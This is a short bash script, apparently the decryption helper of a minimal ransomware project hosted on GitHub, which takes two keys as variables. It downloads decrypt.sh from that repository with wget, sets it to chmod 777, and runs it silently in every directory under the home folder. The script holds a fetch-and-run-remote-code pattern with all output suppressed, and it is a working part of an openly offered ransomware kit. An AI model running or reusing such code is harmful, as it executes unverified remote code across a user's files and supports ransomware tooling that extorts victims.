#!/bin/bash

m="key1" #your decryption ke1 goes here
n="key2" #your decryption key2 goes here
wget -O /tmp/decrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/Decryption/decrypt.sh > /dev/null 2>&1
chmod 777 /tmp/decrypt.sh > /dev/null 2>&1
find ~/ -type d -exec sh -c "cd '{}' ; /tmp/decrypt.sh $m $n;" \; > /dev/null 2>&1
